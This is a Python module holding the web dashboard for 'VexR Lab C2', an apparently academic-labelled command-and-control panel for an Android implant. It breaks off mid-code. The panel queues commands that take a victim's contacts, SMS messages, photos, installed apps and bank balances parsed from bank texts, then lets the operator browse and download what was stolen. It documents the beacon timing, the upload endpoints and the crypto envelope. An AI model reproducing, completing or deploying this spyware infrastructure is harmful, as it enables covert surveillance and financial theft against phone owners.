"""The operator UI.

Kept in its own module because it is a single large document that changes for
reasons unrelated to the HTTP layer.

Design goals, in order:

  1. Answer "is my phone connected, and did my command work?" in one glance.
  2. Never make the operator guess. Every command shows its state, and every
     artifact is one click from its contents.
  3. Degrade honestly. If the implant only ever sends plain heartbeats, the UI
     says so instead of showing an empty table with no explanation.
"""

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VexR Lab C2</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0d12; --surface:#12171f; --surface2:#1a212b; --surface3:#232c38;
  --border:#232c38; --border2:#2e3947;
  --fg:#e4e9f0; --fg2:#9aa5b4; --fg3:#5f6b7c;
  --accent:#3de8b0; --accent-dim:rgba(61,232,176,.12);
  --blue:#5b9dff; --blue-dim:rgba(91,157,255,.12);
  --warn:#f0b132; --warn-dim:rgba(240,177,50,.12);
  --err:#f0564b; --err-dim:rgba(240,86,75,.12);
  --r:10px; --r-sm:7px;
  --mono:ui-monospace,'SF Mono',Menlo,Consolas,monospace;
}
html{font-size:15px}
body{background:var(--bg);color:var(--fg);line-height:1.6;min-height:100vh;
  font-family:system-ui,-apple-system,'Segoe UI',sans-serif;
  -webkit-font-smoothing:antialiased}
a{color:var(--accent);text-decoration:none}
button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
input,select,textarea{font-family:inherit;font-size:14px}

/* ── top bar ───────────────────────────────────────────── */
.top{background:var(--surface);border-bottom:1px solid var(--border);
  padding:0 20px;height:56px;display:flex;align-items:center;
  justify-content:space-between;gap:16px;position:sticky;top:0;z-index:50}
.brand{display:flex;align-items:center;gap:10px}
.brand-name{font-weight:650;font-size:15px;letter-spacing:-.01em}
.brand-name b{color:var(--accent);font-weight:650}
.pill{font-size:11px;font-weight:600;padding:3px 9px;border-radius:99px;
  background:var(--accent-dim);color:var(--accent);letter-spacing:.02em}
.top-right{display:flex;align-items:center;gap:18px;font-size:12.5px;color:var(--fg2)}
.live{display:flex;align-items:center;gap:6px}
.dot{width:7px;height:7px;border-radius:50%;background:var(--accent)}
.dot.on{animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}

/* ── layout ────────────────────────────────────────────── */
.wrap{max-width:1280px;margin:0 auto;padding:20px 20px 80px}

/* ── hero: connection status ───────────────────────────── */
.hero{background:linear-gradient(135deg,var(--surface) 0%,var(--surface2) 100%);
  border:1px solid var(--border);border-radius:var(--r);
  padding:20px 22px;margin-bottom:18px;
  display:flex;align-items:center;justify-content:space-between;gap:24px;flex-wrap:wrap}
.hero-main{display:flex;align-items:center;gap:16px}
.hero-ring{width:52px;height:52px;border-radius:50%;display:grid;place-items:center;
  font-size:22px;flex-shrink:0;border:2px solid var(--border2)}
.hero-ring.up{border-color:var(--accent);background:var(--accent-dim)}
.hero-ring.down{border-color:var(--err);background:var(--err-dim)}
.hero-title{font-size:17px;font-weight:600;letter-spacing:-.01em}
.hero-sub{font-size:13px;color:var(--fg2);margin-top:2px}
.hero-metrics{display:flex;gap:28px;flex-wrap:wrap}
.metric{text-align:right}
.metric .v{font-size:22px;font-weight:650;font-variant-numeric:tabular-nums;
  line-height:1.2;letter-spacing:-.02em}
.metric .l{font-size:11.5px;color:var(--fg3);text-transform:uppercase;
  letter-spacing:.05em;margin-top:1px}

/* ── tabs ──────────────────────────────────────────────── */
.tabs{display:flex;gap:4px;border-bottom:1px solid var(--border);margin-bottom:18px;
  overflow-x:auto;scrollbar-width:none}
.tabs::-webkit-scrollbar{display:none}
.tab{padding:10px 16px;font-size:13.5px;font-weight:500;color:var(--fg3);
  border-bottom:2px solid transparent;margin-bottom:-1px;white-space:nowrap;
  transition:color .12s,border-color .12s;display:flex;align-items:center;gap:7px}
.tab:hover{color:var(--fg2)}
.tab.active{color:var(--fg);border-bottom-color:var(--accent)}
.tab .badge{font-size:11px;font-weight:600;padding:1px 7px;border-radius:99px;
  background:var(--surface3);color:var(--fg2);font-variant-numeric:tabular-nums}
.tab.active .badge{background:var(--accent-dim);color:var(--accent)}
.tab .badge.hot{background:var(--err-dim);color:var(--err)}

/* ── panels ────────────────────────────────────────────── */
.panel{background:var(--surface);border:1px solid var(--border);
  border-radius:var(--r);overflow:hidden;margin-bottom:18px}
.panel-head{padding:14px 18px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;gap:12px}
.panel-title{font-size:14px;font-weight:600;letter-spacing:-.005em}
.panel-sub{font-size:12.5px;color:var(--fg3);margin-top:2px}
.panel-body{padding:18px}

/* ── device cards ──────────────────────────────────────── */
.dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
.dev{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);
  padding:16px 18px;cursor:pointer;transition:border-color .14s,transform .14s}
.dev:hover{border-color:var(--border2);transform:translateY(-1px)}
.dev.selected{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent-dim)}
.dev-top{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;
  margin-bottom:12px}
.dev-name{font-size:15px;font-weight:600;letter-spacing:-.01em;
  display:flex;align-items:center;gap:8px}
.status-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.status-dot.up{background:var(--accent);box-shadow:0 0 8px var(--accent)}
.status-dot.down{background:var(--fg3)}
.dev-id{font-size:11.5px;color:var(--fg3);font-family:var(--mono);margin-top:3px}
.dev-meta{display:grid;grid-template-columns:1fr 1fr;gap:8px 14px;font-size:12.5px}
.dev-meta div{display:flex;justify-content:space-between;gap:8px}
.dev-meta .k{color:var(--fg3)}
.dev-meta .v{color:var(--fg2);font-variant-numeric:tabular-nums;
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

/* ── forms ─────────────────────────────────────────────── */
.field{margin-bottom:14px}
.field:last-child{margin-bottom:0}
.field label{display:block;font-size:12.5px;color:var(--fg2);
  margin-bottom:6px;font-weight:500}
.field .hint{font-size:11.5px;color:var(--fg3);margin-top:5px;line-height:1.5}
select,input[type=text],textarea{width:100%;padding:9px 12px;background:var(--surface2);
  border:1px solid var(--border2);border-radius:var(--r-sm);color:var(--fg);
  outline:none;transition:border-color .12s}
select:focus,input[type=text]:focus,textarea:focus{border-color:var(--accent)}
textarea{resize:vertical;min-height:70px;font-family:var(--mono);font-size:12.5px}
.btn{padding:9px 18px;border-radius:var(--r-sm);font-size:13.5px;font-weight:600;
  transition:filter .12s,background .12s;display:inline-flex;align-items:center;
  justify-content:center;gap:7px}
.btn:disabled{opacity:.45;cursor:not-allowed}
.btn-primary{background:var(--accent);color:#06231b}
.btn-primary:hover:not(:disabled){filter:brightness(1.1)}
.btn-ghost{background:var(--surface2);color:var(--fg);border:1px solid var(--border2)}
.btn-ghost:hover:not(:disabled){background:var(--surface3)}
.btn-sm{padding:6px 12px;font-size:12.5px}

/* ── command grid ──────────────────────────────────────── */
.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@media(max-width:860px){.cmd-grid{grid-template-columns:1fr}}
.cmd-choices{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}
.cmd-choice{padding:11px 13px;background:var(--surface2);border:1px solid var(--border2);
  border-radius:var(--r-sm);text-align:left;transition:border-color .12s,background .12s}
.cmd-choice:hover{border-color:var(--fg3)}
.cmd-choice.sel{border-color:var(--accent);background:var(--accent-dim)}
.cmd-choice .t{font-size:13px;font-weight:600;color:var(--fg)}
.cmd-choice .d{font-size:11.5px;color:var(--fg3);margin-top:2px;line-height:1.45}
.notice{padding:11px 14px;border-radius:var(--r-sm);font-size:12.5px;
  display:flex;gap:9px;align-items:flex-start;line-height:1.55}
.notice.info{background:var(--blue-dim);color:#a9c8ff}
.notice.warn{background:var(--warn-dim);color:#f3cd85}
.notice.err{background:var(--err-dim);color:#ffb0aa}
.notice.ok{background:var(--accent-dim);color:#8ff0d0}

/* ── tables ────────────────────────────────────────────── */
.tbl{width:100%;border-collapse:collapse;font-size:13px}
.tbl thead th{background:var(--surface2);font-weight:500;color:var(--fg3);
  font-size:11px;padding:9px 14px;text-align:left;letter-spacing:.05em;
  text-transform:uppercase;border-bottom:1px solid var(--border);white-space:nowrap}
.tbl tbody td{padding:10px 14px;border-bottom:1px solid var(--border);
  vertical-align:middle}
.tbl tbody tr:last-child td{border-bottom:none}
.tbl tbody tr:hover{background:rgba(255,255,255,.018)}
.mono{font-family:var(--mono);font-size:12px;color:var(--fg2)}
.tag{display:inline-block;font-size:11px;font-weight:600;padding:2px 8px;
  border-radius:99px;letter-spacing:.02em;white-space:nowrap}
.tag.pending{background:var(--surface3);color:var(--fg2)}
.tag.sent{background:var(--blue-dim);color:var(--blue)}
.tag.completed{background:var(--accent-dim);color:var(--accent)}
.tag.expired{background:var(--warn-dim);color:var(--warn)}
.tag.failed{background:var(--err-dim);color:var(--err)}
.tag.enc{background:var(--accent-dim);color:var(--accent)}
.tag.plain{background:var(--warn-dim);color:var(--warn)}
.tag.raw{background:var(--blue-dim);color:var(--blue)}

/* ── artifacts ─────────────────────────────────────────── */
.art-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
.art{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r-sm);
  overflow:hidden;transition:border-color .12s;display:flex;flex-direction:column}
.art:hover{border-color:var(--border2)}
.art-thumb{height:120px;background:var(--surface3);display:grid;place-items:center;
  font-size:32px;overflow:hidden}
.art-thumb img{width:100%;height:100%;object-fit:cover}
.art-info{padding:10px 12px;flex:1;display:flex;flex-direction:column;gap:3px}
.art-name{font-size:12.5px;font-weight:600;font-family:var(--mono);
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.art-meta{font-size:11px;color:var(--fg3);display:flex;gap:8px;flex-wrap:wrap}
.art-actions{display:flex;gap:6px;padding:0 12px 12px}

/* ── empty states ──────────────────────────────────────── */
.empty{padding:52px 24px;text-align:center}
.empty .ico{font-size:36px;opacity:.35;margin-bottom:12px}
.empty .t{font-size:14.5px;font-weight:600;color:var(--fg2);margin-bottom:5px}
.empty .d{font-size:13px;color:var(--fg3);max-width:460px;margin:0 auto;
  line-height:1.6}
.empty .d code{background:var(--surface3);padding:1px 6px;border-radius:4px;
  font-family:var(--mono);font-size:12px;color:var(--fg2)}

/* ── log ───────────────────────────────────────────────── */
.logbox{max-height:420px;overflow-y:auto;font-family:var(--mono);font-size:12px}
.logrow{display:flex;gap:12px;padding:5px 18px;border-bottom:1px solid
  rgba(255,255,255,.03);line-height:1.55}
.logrow:last-child{border-bottom:none}
.logrow .ts{color:var(--fg3);flex-shrink:0;font-variant-numeric:tabular-nums}
.logrow .lv{flex-shrink:0;width:46px;font-weight:600;font-size:11px;
  text-transform:uppercase;letter-spacing:.03em}
.logrow .lv.info{color:var(--accent)}
.logrow .lv.warn{color:var(--warn)}
.logrow .lv.error{color:var(--err)}
.logrow .msg{color:var(--fg2);word-break:break-word}

/* ── modal ─────────────────────────────────────────────── */
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.72);backdrop-filter:blur(3px);
  z-index:100;display:none;align-items:center;justify-content:center;padding:24px}
.modal-bg.open{display:flex}
.modal{background:var(--surface);border:1px solid var(--border2);border-radius:var(--r);
  max-width:900px;width:100%;max-height:86vh;display:flex;flex-direction:column;
  box-shadow:0 20px 60px rgba(0,0,0,.5)}
.modal-head{padding:15px 20px;border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;gap:16px}
.modal-title{font-size:15px;font-weight:600;overflow:hidden;
  text-overflow:ellipsis;white-space:nowrap}
.modal-body{padding:18px 20px;overflow-y:auto;flex:1}
.modal-body pre{background:var(--bg);border:1px solid var(--border);
  border-radius:var(--r-sm);padding:14px;overflow-x:auto;font-family:var(--mono);
  font-size:12.5px;line-height:1.65;color:var(--fg2);white-space:pre-wrap;
  word-break:break-word}
.modal-body img{max-width:100%;border-radius:var(--r-sm);display:block;margin:0 auto}
.close-x{font-size:22px;line-height:1;color:var(--fg3);padding:4px 8px;border-radius:6px}
.close-x:hover{background:var(--surface2);color:var(--fg)}

/* ── misc ──────────────────────────────────────────────── */
.kv{display:grid;grid-template-columns:auto 1fr;gap:7px 16px;font-size:13px}
.kv .k{color:var(--fg3)}
.kv .v{color:var(--fg2);font-family:var(--mono);font-size:12px;
  word-break:break-all}
.spinner{width:14px;height:14px;border:2px solid rgba(0,0,0,.2);
  border-top-color:currentColor;border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.hide{display:none!important}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
  background:var(--surface3);border:1px solid var(--border2);border-radius:99px;
  padding:11px 22px;font-size:13px;font-weight:500;z-index:200;
  box-shadow:0 8px 30px rgba(0,0,0,.45);display:none}
.toast.show{display:block;animation:toastin .2s ease-out}
@keyframes toastin{from{opacity:0;transform:translateX(-50%) translateY(8px)}}
</style>
</head>
<body>

<div class="top">
  <div class="brand">
    <span class="brand-name">VexR <b>Lab C2</b></span>
    <span class="pill">Academic</span>
  </div>
  <div class="top-right">
    <span class="live"><span class="dot on"></span><span id="live-text">Live</span></span>
    <span id="clock"></span>
  </div>
</div>

<div class="wrap">

  <!-- connection hero -->
  <div class="hero">
    <div class="hero-main">
      <div class="hero-ring down" id="hero-ring">◌</div>
      <div>
        <div class="hero-title" id="hero-title">No device connected</div>
        <div class="hero-sub" id="hero-sub">Waiting for the first beacon from the implant.</div>
      </div>
    </div>
    <div class="hero-metrics">
      <div class="metric"><div class="v" id="m-online">0</div><div class="l">Online</div></div>
      <div class="metric"><div class="v" id="m-devices">0</div><div class="l">Devices</div></div>
      <div class="metric"><div class="v" id="m-artifacts">0</div><div class="l">Artifacts</div></div>
      <div class="metric"><div class="v" id="m-pending">0</div><div class="l">Pending</div></div>
    </div>
  </div>

  <!-- tabs -->
  <div class="tabs">
    <button class="tab active" data-tab="overview">Overview</button>
    <button class="tab" data-tab="commands">Commands <span class="badge" id="b-cmds">0</span></button>
    <button class="tab" data-tab="artifacts">Artifacts <span class="badge" id="b-arts">0</span></button>
    <button class="tab" data-tab="beacons">Beacons</button>
    <button class="tab" data-tab="log">Log</button>
  </div>

  <!-- ══ OVERVIEW ══ -->
  <section id="tab-overview">
    <div class="panel">
      <div class="panel-head">
        <div>
          <div class="panel-title">Devices</div>
          <div class="panel-sub">Click a device to target it with commands.</div>
        </div>
        <button class="btn btn-ghost btn-sm" onclick="refresh()">Refresh</button>
      </div>
      <div class="panel-body" id="devices-wrap">
        <div class="empty"><div class="ico">📡</div>
          <div class="t">No devices yet</div>
          <div class="d">Install the lab build and open it. It beacons every 30 seconds.</div>
        </div>
      </div>
    </div>
  </section>

  <!-- ══ COMMANDS ══ -->
  <section id="tab-commands" class="hide">
    <div class="cmd-grid">
      <div class="panel">
        <div class="panel-head"><div>
          <div class="panel-title">Send command</div>
          <div class="panel-sub">Delivered on the device's next heartbeat.</div>
        </div></div>
        <div class="panel-body">
          <div class="field">
            <label>Target device</label>
            <select id="cmd-device"><option value="">Select a device…</option></select>
          </div>
          <div class="field">
            <label>Command</label>
            <div class="cmd-choices" id="cmd-choices"></div>
          </div>
          <div class="field">
            <label>Parameters <span style="color:var(--fg3);font-weight:400">(optional)</span></label>
            <input type="text" id="cmd-params" placeholder='{"count": "20"}'>
            <div class="hint">JSON object merged into the command payload.</div>
          </div>
          <button class="btn btn-primary" id="cmd-send" style="width:100%"
                  onclick="sendCommand()" disabled>Send command</button>
          <div id="cmd-feedback" style="margin-top:12px"></div>
        </div>
      </div>

      <div class="panel">
        <div class="panel-head"><div>
          <div class="panel-title">How delivery works</div>
        </div></div>
        <div class="panel-body">
          <div class="notice info" style="margin-bottom:14px">
            <span>ℹ</span>
            <div>Commands are <b>pull-based</b>. The server queues them; the implant
            collects them on its next beacon and pushes the result back to
            <code>/file.php</code>. Expect up to 30 s while its heartbeat service
            runs, or up to 3 min when only the keep-alive alarm is waking it.</div>
          </div>
          <div class="kv">
            <span class="k">Uplink</span><span class="v">/panel.php · /file.php</span>
            <span class="k">Beacon</span><span class="v">every 30 s</span>
            <span class="k">Keep-alive</span><span class="v">every 3 min</span>
            <span class="k">Envelope</span><span class="v">v=3&amp;d=&amp;k=&amp;i=</span>
            <span class="k">Crypto</span><span class="v">AES-256-CBC + RSA-2048</span>
            <span class="k">Auth</span><span class="v">X-Auth-Token</span>
          </div>
          <div class="notice warn" style="margin-top:14px">
            <span>⚠</span>
            <div><b>Results arrive as raw files.</b> The implant uploads command
            output unencrypted, so a result shows up under <b>Artifacts</b>, not
            under Beacons.</div>
          </div>
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-head">
        <div><div class="panel-title">Command history</div>
        <div class="panel-sub">Sent commands and whether an artifact came back.</div></div>
      </div>
      <div id="cmd-history">
        <div class="empty"><div class="ico">⌘</div>
          <div class="t">No commands sent yet</div>
          <div class="d">Pick a device above and send your first command.</div></div>
      </div>
    </div>
  </section>

  <!-- ══ ARTIFACTS ══ -->
  <section id="tab-artifacts" class="hide">
    <div class="panel">
      <div class="panel-head">
        <div><div class="panel-title">Artifacts</div>
        <div class="panel-sub">Everything the implant has uploaded.</div></div>
      </div>
      <div class="panel-body" id="artifacts-wrap">
        <div class="empty"><div class="ico">📎</div>
          <div class="t">No artifacts yet</div>
          <div class="d">Command results land here. Send a command and give it
          up to 30 s, or 3 min if the phone is asleep.</div></div>
      </div>
    </div>
  </section>

  <!-- ══ BEACONS ══ -->
  <section id="tab-beacons" class="hide">
    <div class="panel">
      <div class="panel-head">
        <div><div class="panel-title">Beacons</div>
        <div class="panel-sub">Heartbeats and status payloads from /panel.php.</div></div>
      </div>
      <div id="beacons-wrap"></div>
    </div>
  </section>

  <!-- ══ LOG ══ -->
  <section id="tab-log" class="hide">
    <div class="panel">
      <div class="panel-head"><div><div class="panel-title">Server log</div></div>
        <button class="btn btn-ghost btn-sm" onclick="loadLog()">Refresh</button></div>
      <div class="logbox" id="log-wrap"></div>
    </div>
  </section>

</div>

<div class="modal-bg" id="modal" onclick="if(event.target===this)closeModal()">
  <div class="modal">
    <div class="modal-head">
      <div class="modal-title" id="modal-title">Artifact</div>
      <div style="display:flex;gap:8px;align-items:center">
        <a class="btn btn-ghost btn-sm" id="modal-dl" href="#" download>Download</a>
        <button class="close-x" onclick="closeModal()">×</button>
      </div>
    </div>
    <div class="modal-body" id="modal-body"></div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
'use strict';

const COMMANDS = [
  { id:'contacts',  name:'Contacts',       desc:'Phone contact list' },
  { id:'allsms',    name:'SMS',            desc:'All messages' },
  { id:'gallery',   name:'Gallery',        desc:'Photos and images' },
  { id:'applist',   name:'Apps',           desc:'Installed packages' },
  { id:'balance',   name:'Bank balance',   desc:'Parsed from bank SMS' },
  { id:'discovery', name:'Full discovery', desc:'Everything at once' },
];

let state = { devices: [], selected: null, command: 'contacts', tab: 'overview' };
let timer = null;

/* ── helpers ─────────────────────────────────────────── */
const $  = s => document.querySelector(s);
const esc = s => String(s ?? '').replace(/[&<>"']/g,
  c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

function bytes(n){
  if(n < 1024) return n + ' B';
  if(n < 1048576) return (n/1024).toFixed(1) + ' KB';
  return (n/1048576).toFixed(1) + ' MB';
}
function ago(iso){
  if(!iso) return '—';
  const d = (Date.now() - new Date(iso).getTime())/1000;
  if(d < 5) return 'just now';
  if(d < 60) return Math.floor(d) + 's ago';
  if(d < 3600) return Math.floor(d/60) + 'm ago';
  if(d < 86400) return Math.floor(d/3600) + 'h ago';
  return Math.floor(d/86400) + 'd ago';
}
function toast(msg){
  const t = $('#toast'); t.textContent = msg; t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'), 2600);
}
async function api(path, opts){
  const r = await fetch(path, Object.assign({credentials:'same-origin'}, opts));
  if(r.status === 401){ location.href = '/'; throw new Error('unauthorized'); }
  if(!r.ok) throw new Error((await r.text()).slice(0,200) || r.statusText);
  return r.json();
}

/* ── tabs ────────────────────────────────────────────── */
document.querySelectorAll('.tab').forEach(btn => {
  btn.onclick = () => {
    state.tab = btn.dataset.tab;
    document.querySelectorAll('.tab').forEach(b =>
      b.classList.toggle('active', b === btn));
    document.querySelectorAll('section[id^=tab-]').forEach(s =>
      s.classList.toggle('hide', s.id !== 'tab-' + state.tab));
    if(state.tab === 'log') loadLog();
  };
});

/* ── render: devices ─────────────────────────────────── */
function renderDevices(){
  const wrap = $('#devices-wrap');
  if(!state.devices.length){
    wrap.innerHTML = `<div class="empty"><div class="ico">📡</div>
      <div class="t">No devices yet</div>
      <div class="d">Install the lab build and open it. It beacons every 30 seconds.</div></div>`;
    return;
  }
  wrap.innerHTML = '<div class="dev-grid">' + state.devices.map(d => `
    <div class="dev ${d.device_key === state.selected ? 'selected':''}"
         onclick="selectDevice('${esc(d.device_key)}')">
      <div class="dev-top">
        <div>
          <div class="dev-name">
            <span class="status-dot ${d.online ? 'up':'down'}"></span>
            ${esc(d.model || 'Unknown device')}
          </div>
          <div class="dev-id">${esc(d.device_key)}</div>
        </div>
      </div>
      <div class="dev-meta">
        <div><span class="k">Android</span><span class="v">${esc(d.android_ver || '—')}</span></div>
        <div><span class="k">Maker</span><span class="v">${esc(d.manufacturer || '—')}</span></div>
        <div><span class="k">Beacons</span><span class="v">${d.beacons ?? 0}</span></div>
        <div><span class="k">Artifacts</span><span class="v">${d.artifacts ?? 0}</span></div>
        <div><span class="k">Last seen</span><span class="v">${ago(d.last_seen)}</span></div>
        <div><span class="k">Pending</span><span class="v">${d.commands_pending ?? 0}</span></div>
      </div>
    </div>`).join('') + '</div>';
}

function selectDevice(key){
  state.selected = key;
  renderDevices();
  const sel = $('#cmd-device');
  if(sel) sel.value = key;
  toast('Targeting ' + key.slice(0,12));
  if(state.tab !== 'commands'){
    document.querySelector('.tab[data-tab=commands]').click();
  }
}

/* ── render: hero ────────────────────────────────────── */
function renderHero(stats){
  const online = stats.online || 0;
  const ring = $('#hero-ring');
  ring.className = 'hero-ring ' + (online ? 'up' : 'down');
  ring.textContent = online ? '✓' : '◌';
  if(online){
    const d = state.devices.find(x => x.online);
    $('#hero-title').textContent = (d?.model || 'Device') + ' is connected';
    $('#hero-sub').textContent = 'Last beacon ' + ago(d?.last_seen) + ' · ' +
      (d?.beacons ?? 0) + ' beacons received';
  } else if(state.devices.length){
    $('#hero-title').textContent = 'Device offline';
    $('#hero-sub').textContent = 'Last seen ' + ago(state.devices[0].last_seen) +
      ' — open the app on the phone to resume.';
  } else {
    $('#hero-title').textContent = 'No device connected';
    $('#hero-sub').textContent = 'Waiting for the first beacon from the implant.';
  }
  $('#m-online').textContent = online;
  $('#m-devices').textContent = stats.devices || 0;
  $('#m-artifacts').textContent = stats.artifacts || 0;
  $('#m-pending').textContent = stats.commands_pending || 0;
  $('#b-cmds').textContent = stats.commands_pending || 0;
  $('#b-cmds').className = 'badge' + (stats.commands_pending ? ' hot' : '');
  $('#b-arts').textContent = stats.artifacts || 0;
}

/* ── render: command picker ──────────────────────────── */
function renderCommandChoices(){
  $('#cmd-choices').innerHTML = COMMANDS.map(c => `
    <button class="cmd-choice ${c.id === state.command ? 'sel':''}"
            onclick="pickCommand('${c.id}')">
      <div class="t">${esc(c.name)}</div>
      <div class="d">${esc(c.desc)}</div>
    </button>`).join('');
}
function pickCommand(id){
  state.command = id;
  renderCommandChoices();
}

function renderDeviceSelect(){
  const sel = $('#cmd-device');
  if(!sel) return;
  sel.innerHTML = '<option value="">Select a device…</option>' +
    state.devices.map(d =>
      `<option value="${esc(d.device_key)}" ${d.device_key===state.selected?'selected':''}>
        ${esc(d.model || 'Unknown')} · ${esc(d.device_key.slice(0,10))}
      </option>`).join('');
  sel.onchange = e => { state.selected = e.target.value || null; renderDevices(); };
  updateSendState();
}

function updateSendState(){
  const btn = $('#cmd-send');
  if(btn) btn.disabled = !state.selected;
}

/* ── commands ────────────────────────────────────────── */
async function sendCommand(){
  if(!state.selected) return;
  const btn = $('#cmd-send');
  const fb = $('#cmd-feedback');
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending…';

  let params = $('#cmd-params').value.trim() || null;
  if(params){
    try { JSON.parse(params); }
    catch { fb.innerHTML = '<div class="notice err"><span>✕</span><div>Parameters are not valid JSON.</div></div>';
            btn.disabled = false; btn.textContent = 'Send command'; return; }
  }

  try{
    const r = await api('/api/command', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ device_key: state.selected,
                             command: state.command, params })
    });
    fb.innerHTML = `<div class="notice ok"><span>✓</span><div>
      <b>${esc(r.command)}</b> queued (id ${r.id}). The device will collect it
      on its next heartbeat — usually within 30 s, up to 3 min if asleep.</div></div>`;
    loadCommands();
  }catch(e){
    fb.innerHTML = `<div class="notice err"><span>✕</span><div>${esc(e.message)}</div></div>`;
  }
  btn.disabled = false;
  btn.textContent = 'Send command';
  updateSendState();
}

async function loadCommands(){
  try{
    const {commands} = await api('/api/commands?limit=40');
    const wrap = $('#cmd-history');
    if(!commands.length){
      wrap.innerHTML = `<div class="empty"><div class="ico">⌘</div>
        <div class="t">No commands sent yet</div>
        <div class="d">Pick a device above and send your first command.</div></div>`;
      return;
    }
    wrap.innerHTML = `<table class="tbl"><thead><tr>
      <th>#</th><th>Device</th><th>Command</th><th>Status</th>
      <th>Queued</th><th>Result</th></tr></thead><tbody>` +
      commands.map(c => `<tr>
        <td class="mono">${c.id}</td>
        <td class="mono">${esc((c.device_key||'').slice(0,12))}</td>
        <td><b>${esc(c.command)}</b></td>
        <td><span class="tag ${esc(c.status)}">${esc(c.status)}</span></td>
        <td style="color:var(--fg3);font-size:12px">${ago(c.created_at)}</td>
        <td>${c.artifact_id
          ? `<a href="#" onclick="openArtifact(${c.artifact_id});return false"
                style="font-size:12.5px">View artifact →</a>`
          : `<span style="color:var(--fg3);font-size:12px">—</span>`}</td>
      </tr>`).join('') + '</tbody></table>';
  }catch(e){ /* leave the previous render in place */ }
}

/* ── artifacts ───────────────────────────────────────── */
const KIND_ICON = {
  contacts:'👤', sms:'💬', calllog:'📞', image:'🖼', applist:'📦',
  archive:'🗜', text:'📄', other:'📎'
};

async function loadArtifacts(){
  try{
    const {artifacts} = await api('/api/artifacts?limit=60');
    const wrap = $('#artifacts-wrap');
    if(!artifacts.length){
      wrap.innerHTML = `<div class="empty"><div class="ico">📎</div>
        <div class="t">No artifacts yet</div>
        <div class="d">Command results land here. Send a command and give it
        up to 30 s, or 3 min if the phone is asleep.</div></div>`;
      return;
    }
    wrap.innerHTML = '<div class="art-grid">' + artifacts.map(a => `
      <div class="art">
        <div class="art-thumb">${
          a.kind === 'image'
            ? `<img src="/api/artifacts/${a.id}/preview" loading="lazy" alt="">`
            : (KIND_ICON[a.kind] || '📎')
        }</div>
        <div class="art-info">
          <div class="art-name" title="${esc(a.filename)}">${esc(a.filename)}</div>
          <div class="art-meta">
            <span>${esc(a.kind)}</span><span>${bytes(a.size_bytes)}</span>
            <span>${ago(a.received_at)}</span>
          </div>
        </div>
        <div class="art-actions">
          <button class="btn btn-ghost btn-sm" style="flex:1"
                  onclick="openArtifact(${a.id})">View</button>
          <a class="btn btn-ghost btn-sm" style="flex:1"
             href="/api/artifacts/${a.id}/download" download>Save</a>
        </div>
      </div>`).join('') + '</div>';
  }catch(e){ /* keep previous */ }
}

async function openArtifact(id){
  const bg = $('#modal');
  $('#modal-title').textContent = 'Loading…';
  $('#modal-body').innerHTML = '';
  $('#modal-dl').href = `/api/artifacts/${id}/download`;
  bg.classList.add('open');

  try{
    const {artifacts} = await api('/api/artifacts?limit=200');
    const a = artifacts.find(x => x.id === id);
    $('#modal-title').textContent = a ? a.filename : 'Artifact #' + id;

    if(a && a.kind === 'image'){
      $('#modal-body').innerHTML = `<img src="/api/artifacts/${id}/preview" alt="">`;
    } else {
      const r = await fetch(`/api/artifacts/${id}/preview`,
                             {credentials:'same-origin'});
      const text = await r.text();
      $('#modal-body').innerHTML =
        `<pre>${esc(text.slice(0, 200000))}</pre>` +
        (text.length > 200000
          ? '<div class="notice warn" style="margin-top:12px"><span>⚠</span>' +
            '<div>Preview truncated. Download for the full file.</div></div>' : '');
    }
  }catch(e){
    $('#modal-body').innerHTML =
      `<div class="notice err"><span>✕</span><div>${esc(e.message)}</div></div>`;
  }
}
function closeModal(){ $('#modal').classList.remove('open'); }

/* ── beacons ─────────────────────────────────────────── */
async function loadBeacons(){
  try{
    const {beacons} = await api('/api/beacons?limit=60');
    const wrap = $('#beacons-wrap');
    if(!beacons.length){
      wrap.innerHTML = `<div class="empty"><div class="ico">📨</div>
        <div class="t">No beacons yet</div></div>`;
      return;
    }
    wrap.innerHTML = `<table class="tbl"><thead><tr>
      <th>#</th><th>Device</th><th>Action</th><th>Transport</th>
      <th>Battery</th><th>Network</th><th>Received</th><th></th>
      </tr></thead><tbody>` + beacons.map(b => {
        const p = b.payload_parsed || {};
        const t = b.transport || 'encrypted';
        return `<tr>
          <td class="mono">${b.id}</td>
          <td class="mono">${esc((b.device_key||'').slice(0,12))}</td>
          <td><b>${esc(b.action || '—')}</b></td>
          <td><span class="tag ${t==='encrypted'?'enc':'plain'}">${esc(t)}</span></td>
          <td class="mono">${esc(p.battery_level ?? '—')}</td>
          <td class="mono">${esc(p.network_type ?? '—')}</td>
          <td style="color:var(--fg3);font-size:12px">${ago(b.received_at)}</td>
          <td><button class="btn btn-ghost btn-sm"
              onclick='showPayload(${JSON.stringify(JSON.stringify(p, null, 2))})'>JSON</button></td>
        </tr>`;
